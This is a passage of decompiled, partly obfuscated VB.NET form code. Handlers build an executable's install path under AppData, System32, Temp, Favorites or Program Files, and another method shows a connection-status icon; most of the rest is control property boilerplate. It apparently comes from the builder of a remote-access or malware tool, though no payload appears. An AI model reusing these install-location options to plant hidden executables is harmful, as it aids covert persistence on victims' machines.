                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.System), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.System) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton4.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Path.GetTempPath, "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Path.GetTempPath & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton5.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.Favorites), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.Favorites) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton3.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ProgramFiles), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ProgramFiles) & "\" & Me.TextBox8.Text & ".exe")
                End If
            End If
        End Sub

        Private Sub TextBox9_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ApplicationData), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton2.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.System), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.System) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton3.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ProgramFiles), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ProgramFiles) & "\" & Me.TextBox8.Text & ".exe")
                End If
            End If
        End Sub

        Public Sub ToggleConnectionResult(ByVal success As Integer)
            Select Case success
                Case 0
                    Me.PictureBox5.Image = Class5.smethod_86
                    Exit Select
                Case 1
                    Me.PictureBox5.Image = Class5.smethod_22
                    Exit Select
                Case 4
                    Me.PictureBox5.Image = Nothing
                    Exit Select
            End Select
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = value
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button3 As Button
            Get
                Return Me._Button3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button3_Click)
                If (Not Me._Button3 Is Nothing) Then
                    RemoveHandler Me._Button3.Click, handler
                End If
                Me._Button3 = value
                If (Not Me._Button3 Is Nothing) Then
                    AddHandler Me._Button3.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button4 As Button
            Get
                Return Me._Button4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button4_Click)
                If (Not Me._Button4 Is Nothing) Then
                    RemoveHandler Me._Button4.Click, handler
                End If
                Me._Button4 = value
                If (Not Me._Button4 Is Nothing) Then
                    AddHandler Me._Button4.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox_0 As CheckBox
            Get
                Return Me.checkBox_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me.checkBox_0 = value
            End Set
        End Property

        Friend Overridable Property CheckBox_1 As CheckBox
            Get
                Return Me.checkBox_1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me.checkBox_1 = value
            End Set
        End Property

        Friend Overridable Property CheckBox_2 As CheckBox
            Get
                Return Me.checkBox_2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me.checkBox_2 = value
            End Set
        End Property

        Friend Overridable Property CheckBox_3 As CheckBox
            Get
                Return Me.checkBox_3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me.checkBox_3 = value
            End Set
        End Property

        Friend Overridable Property CheckBox_4 As CheckBox
            Get
                Return Me.checkBox_4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me.checkBox_4 = value
            End Set
        End Property

        Friend Overridable Property CheckBox_5 As CheckBox
            Get
                Return Me.checkBox_5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CheckBox_5_CheckedChanged)
                If (Not Me.checkBox_5 Is Nothing) Then
                    RemoveHandler Me.checkBox_5.CheckedChanged, handler
                End If
                Me.checkBox_5 = value
                If (Not Me.checkBox_5 Is Nothing) Then
                    AddHandler Me.checkBox_5.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox1 As CheckBox
            Get
                Return Me._CheckBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CheckBox1_CheckedChanged)
                If (Not Me._CheckBox1 Is Nothing) Then
                    RemoveHandler Me._CheckBox1.CheckedChanged, handler
                End If
                Me._CheckBox1 = value
                If (Not Me._CheckBox1 Is Nothing) Then
                    AddHandler Me._CheckBox1.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox2 As CheckBox
            Get
                Return Me._CheckBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CheckBox2_CheckedChanged)
                If (Not Me._CheckBox2 Is Nothing) Then
                    RemoveHandler Me._CheckBox2.CheckedChanged, handler
                End If
                Me._CheckBox2 = value
                If (Not Me._CheckBox2 Is Nothing) Then
                    AddHandler Me._CheckBox2.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox3 As CheckBox
            Get
                Return Me._CheckBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CheckBox3_CheckedChanged)
                If (Not Me._CheckBox3 Is Nothing) Then
                    RemoveHandler Me._CheckBox3.CheckedChanged, handler
                End If
                Me._CheckBox3 = value
                If (Not Me._CheckBox3 Is Nothing) Then
                    AddHandler Me._CheckBox3.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox4 As CheckBox
            Get
                Return Me._CheckBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox4 = value
            End Set
        End Property

        Friend Overridable Property CheckBox5 As CheckBox
            Get
                Return Me._CheckBox5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox5 = value
            End Set
        End Property

        Friend Overridable Property CheckBox6 As CheckBox
            Get
                Return Me._CheckBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox6 = value
            End Set
        End Property

        Friend Overridable Property CheckBox7 As CheckBox
            Get
                Return Me._CheckBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox7 = value
            End Set
        End Property

        Friend Overridable Property CheckBox8 As CheckBox
            Get
                Return Me._CheckBox8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox8 = value
            End Set
        End Property

        Friend Overridable Property CheckBox9 As CheckBox
            Get
                Return Me._CheckBox9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox9 = value
            End Set
        End Property

        Friend Overridable Property GroupBox_0 As GroupBox
            Get
                Return Me.groupBox_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me.groupBox_0 = value
            End Set
        End Property

        Friend Overridable Property GroupBox1 As GroupBox
            Get
                Return Me._GroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox1 = value
            End Set
        End Property

        Friend Overridable Property GroupBox2 As GroupBox
            Get
                Return Me._GroupBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox2 = value
            End Set
        End Property

        Friend Overridable Property GroupBox3 As GroupBox
            Get
                Return Me._GroupBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox3 = value
            End Set
        End Property

        Friend Overridable Property GroupBox4 As GroupBox
            Get
                Return Me._GroupBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox4 = value
            End Set
        End Property

        Friend Overridable Property GroupBox5 As GroupBox
            Get
                Return Me._GroupBox5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox5 = value
            End Set
        End Property

        Friend Overridable Property GroupBox6 As GroupBox
            Get
                Return Me._GroupBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox6 = value
            End Set
        End Property

        Friend Overridable Property GroupBox7 As GroupBox
            Get
                Return Me._GroupBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox7 = value
            End Set
        End Property

        Friend Overridable Property GroupBox8 As GroupBox
            Get
                Return Me._GroupBox8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox8 = value
            End Set
        End Property

        Friend Overridable Property GroupBox9 As GroupBox
            Get
                Return Me._GroupBox9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox9 = value
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label10 As Label
            Get
                Return Me._Label10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label10 = value
            End Set
        End Property

        Friend Overridable Property Label11 As Label
            Get
                Return Me._Label11
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label11 = value
            End Set
        End Property

        Friend Overridable Property Label12 As Label
            Get
                Return Me._Label12
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label12 = value
            End Set
        End Property

        Friend Overridable Property Label13 As Label
            Get
                Return Me._Label13
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label13 = value
            End Set
        End Property

        Friend Overridable Property Label14 As Label
            Get
                Return Me._Label14
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label14 = value
            End Set
        End Property

        Friend Overridable Property Label15 As Label
            Get
                Return Me._Label15
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label15 = value
            End Set
        End Property

        Friend Overridable Property Label16 As Label
            Get
                Return Me._Label16
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label16 = value
            End Set
        End Property

        Friend Overridable Property Label17 As Label
            Get
                Return Me._Label17
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label17 = value
            End Set
        End Property

        Friend Overridable Property Label18 As Label
            Get
                Return Me._Label18
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label18 = value
            End Set
        End Property

        Friend Overridable Property Label19 As Label
            Get
                Return Me.YrTaPhYjR
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me.YrTaPhYjR = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property Label20 As Label
            Get
                Return Me._Label20
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label20 = value
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label3 = value
            End Set
        End Property

        Friend Overridable Property Label4 As Label
            Get
                Return Me._Label4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label4 = value
            End Set
        End Property

        Friend Overridable Property Label5 As Label
            Get
                Return Me._Label5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label5 = value
            End Set
        End Property

        Friend Overridable Property Label6 As Label
            Get
                Return Me._Label6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label6 = value
            End Set
        End Property

        Friend Overridable Property Label7 As Label
            Get
                Return Me._Label7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label7 = value
            End Set
        End Property

        Friend Overridable Property Label8 As Label
            Get
                Return Me._Label8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label8 = value
            End Set
        End Property

        Friend Overridable Property Label9 As Label
            Get
                Return Me._Label9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label9 = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property PictureBox2 As PictureBox
            Get
                Return Me.hpyZaNmIi
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me.hpyZaNmIi = value
            End Set
        End Property

        Friend Overridable Property PictureBox3 As PictureBox
            Get
                Return Me._PictureBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox3 = value
            End Set
        End Property

        Friend Overridable Property PictureBox4 As PictureBox
            Get
                Return Me._PictureBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox4 = value
            End Set
        End Property

        Friend Overridable Property PictureBox5 As PictureBox
            Get
                Return Me._PictureBox5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox5 = value
            End Set
        End Property

        Friend Overridable Property PictureBox6 As PictureBox
            Get
                Return Me._PictureBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox6 = value
            End Set
        End Property

        Friend Overridable Property PictureBox7 As PictureBox
            Get
                Return Me._PictureBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox7 = value
            End Set
        End Property

        Friend Overridable Property RadioButton1 As RadioButton
            Get
                Return Me._RadioButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton1_CheckedChanged)
                If (Not Me._RadioButton1 Is Nothing) Then
                    RemoveHandler Me._RadioButton1.CheckedChanged, handler
                End If
                Me._RadioButton1 = value
                If (Not Me._RadioButton1 Is Nothing) Then
                    AddHandler Me._RadioButton1.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton2 As RadioButton
            Get
                Return Me._RadioButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton2_CheckedChanged)
                If (Not Me._RadioButton2 Is Nothing) Then
                    RemoveHandler Me._RadioButton2.CheckedChanged, handler
                End If
                Me._RadioButton2 = value
                If (Not Me._RadioButton2 Is Nothing) Then
                    AddHandler Me._RadioButton2.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton3 As RadioButton
            Get
                Return Me._RadioButton3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton3_CheckedChanged)
                If (Not Me._RadioButton3 Is Nothing) Then
                    RemoveHandler Me._RadioButton3.CheckedChanged, handler
                End If
                Me._RadioButton3 = value
                If (Not Me._RadioButton3 Is Nothing) Then
                    AddHandler Me._RadioButton3.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton4 As RadioButton
            Get
                Return Me._RadioButton4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton4_CheckedChanged)
                If (Not Me._RadioButton4 Is Nothing) Then
                    RemoveHandler Me._RadioButton4.CheckedChanged, handler
                End If
                Me._RadioButton4 = value
                If (Not Me._RadioButton4 Is Nothing) Then
                    AddHandler Me._RadioButton4.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton5 As RadioButton
            Get
                Return Me._RadioButton5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton5_CheckedChanged)
                If (Not Me._RadioButton5 Is Nothing) Then
                    RemoveHandler Me._RadioButton5.CheckedChanged, handler
                End If
                Me._RadioButton5 = value
                If (Not Me._RadioButton5 Is Nothing) Then
                    AddHandler Me._RadioButton5.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton6 As RadioButton
            Get
                Return Me._RadioButton6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton6_CheckedChanged)
                If (Not Me._RadioButton6 Is Nothing) Then
                    RemoveHandler Me._RadioButton6.CheckedChanged, handler
                End If
                Me._RadioButton6 = value
                If (Not Me._RadioButton6 Is Nothing) Then
                    AddHandler Me._RadioButton6.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property SideTab1 As Control0
            Get
                Return Me._SideTab1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Control0)
                Me._SideTab1 = value
            End Set
        End Property

        Friend Overridable Property TabPage1 As TabPage
            Get
                Return Me._TabPage1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage1 = value
            End Set
        End Property

        Friend Overridable Property TabPage2 As TabPage
            Get
                Return Me._TabPage2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage2 = value
            End Set
        End Property

        Friend Overridable Property TabPage3 As TabPage
            Get
                Return Me._TabPage3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage3 = value
            End Set
        End Property

        Friend Overridable Property TabPage4 As TabPage
            Get
                Return Me._TabPage4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage4 = value
            End Set
        End Property

        Friend Overridable Property TabPage5 As TabPage
            Get
                Return Me._TabPage5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage5 = value
            End Set
        End Property

        Friend Overridable Property TabPage6 As TabPage
            Get
                Return Me._TabPage6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage6 = value
            End Set
        End Property

        Friend Overridable Property TabPage7 As TabPage
            Get
                Return Me._TabPage7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TabPage7_Click)
                If (Not Me._TabPage7 Is Nothing) Then
                    RemoveHandler Me._TabPage7.Click, handler
                End If
                Me._TabPage7 = value
                If (Not Me._TabPage7 Is Nothing) Then
                    AddHandler Me._TabPage7.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox_0 As TextBox
            Get
                Return Me.textBox_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me.textBox_0 = value
            End Set
        End Property

        Friend Overridable Property TextBox_1 As TextBox
            Get
                Return Me.textBox_1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me.textBox_1 = value
            End Set
        End Property

        Friend Overridable Property TextBox_2 As TextBox
            Get
                Return Me.textBox_2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me.textBox_2 = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As KeyPressEventHandler = New KeyPressEventHandler(AddressOf Me.TextBox2_KeyPress)
                If (Not Me._TextBox2 Is Nothing) Then
                    RemoveHandler Me._TextBox2.KeyPress, handler
                End If
                Me._TextBox2 = value
                If (Not Me._TextBox2 Is Nothing) Then
                    AddHandler Me._TextBox2.KeyPress, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox3 = value
            End Set
        End Property

        Friend Overridable Property TextBox4 As TextBox
            Get
                Return Me._TextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox4 = value
            End Set
        End Property

        Friend Overridable Property TextBox5 As TextBox
            Get
                Return Me._TextBox5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox5 = value
            End Set
        End Property

        Friend Overridable Property TextBox6 As TextBox
            Get
                Return Me._TextBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox6 = value
            End Set
        End Property

        Friend Overridable Property TextBox7 As TextBox
            Get
                Return Me._TextBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox7 = value
            End Set
        End Property

        Friend Overridable Property TextBox8 As TextBox
            Get
                Return Me._TextBox8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox8_TextChanged)
                If (Not Me._TextBox8 Is Nothing) Then
                    RemoveHandler Me._TextBox8.TextChanged, handler
                End If
                Me._TextBox8 = value
                If (Not Me._TextBox8 Is Nothing) Then
                    AddHandler Me._TextBox8.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox9 As TextBox
            Get
                Return Me._TextBox9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox9_TextChanged)
                If (Not Me._TextBox9 Is Nothing) Then
                    RemoveHandler Me._TextBox9.TextChanged, handler
                End If
                Me._TextBox9 = value
                If (Not Me._TextBox9 Is Nothing) Then
                    AddHandler Me._TextBox9.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property ToolTip1 As ToolTip
            Get
                Return Me.toolTip_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolTip)
                Me.toolTip_0 = value
            End Set
        End Property

        Friend Overridable Property Win8Progressbar1 As Win8Progressbar
            Get
                Return Me._Win8Progressbar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Win8Progressbar)
                Me._Win8Progressbar1 = value
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("Button3")> _
        Private _Button3 As Button
        <AccessedThroughProperty("Button4")> _
        Private _Button4 As Button
        <AccessedThroughProperty("CheckBox1")> _
        Private _CheckBox1 As CheckBox
        <AccessedThroughProperty("CheckBox2")> _
        Private _CheckBox2 As CheckBox
        <AccessedThroughProperty("CheckBox3")> _
        Private _CheckBox3 As CheckBox
        <AccessedThroughProperty("CheckBox4")> _
        Private _CheckBox4 As CheckBox
        <AccessedThroughProperty("CheckBox5")> _
        Private _CheckBox5 As CheckBox
        <AccessedThroughProperty("CheckBox6")> _
        Private _CheckBox6 As CheckBox
        <AccessedThroughProperty("CheckBox7")> _
        Private _CheckBox7 As CheckBox
        <AccessedThroughProperty("CheckBox8")> _
        Private _CheckBox8 As CheckBox
        <AccessedThroughProperty("CheckBox9")> _
        Private _CheckBox9 As CheckBox
        <AccessedThroughProperty("GroupBox1")> _
        Private _GroupBox1 As GroupBox
        <AccessedThroughProperty("GroupBox2")> _
        Private _GroupBox2 As GroupBox
        <AccessedThroughProperty("GroupBox3")> _
        Private _GroupBox3 As GroupBox
        <AccessedThroughProperty("GroupBox4")> _
        Private _GroupBox4 As GroupBox
        <AccessedThroughProperty("GroupBox5")> _
        Private _GroupBox5 As GroupBox
        <AccessedThroughProperty("GroupBox6")> _
        Private _GroupBox6 As GroupBox
        <AccessedThroughProperty("GroupBox7")> _
        Private _GroupBox7 As GroupBox
        <AccessedThroughProperty("GroupBox8")> _
        Private _GroupBox8 As GroupBox
        <AccessedThroughProperty("GroupBox9")> _
        Private _GroupBox9 As GroupBox
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label10")> _
        Private _Label10 As Label
        <AccessedThroughProperty("Label11")> _
        Private _Label11 As Label
        <AccessedThroughProperty("Label12")> _
        Private _Label12 As Label
        <AccessedThroughProperty("Label13")> _
        Private _Label13 As Label
        <AccessedThroughProperty("Label14")> _
        Private _Label14 As Label
        <AccessedThroughProperty("Label15")> _
        Private _Label15 As Label
        <AccessedThroughProperty("Label16")> _
        Private _Label16 As Label
        <AccessedThroughProperty("Label17")> _
        Private _Label17 As Label
        <AccessedThroughProperty("Label18")> _
        Private _Label18 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label20")> _
        Private _Label20 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("Label4")> _
        Private _Label4 As Label
        <AccessedThroughProperty("Label5")> _
        Private _Label5 As Label
        <AccessedThroughProperty("Label6")> _
        Private _Label6 As Label
        <AccessedThroughProperty("Label7")> _
        Private _Label7 As Label
        <AccessedThroughProperty("Label8")> _
        Private _Label8 As Label
        <AccessedThroughProperty("Label9")> _
        Private _Label9 As Label
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("PictureBox3")> _
        Private _PictureBox3 As PictureBox
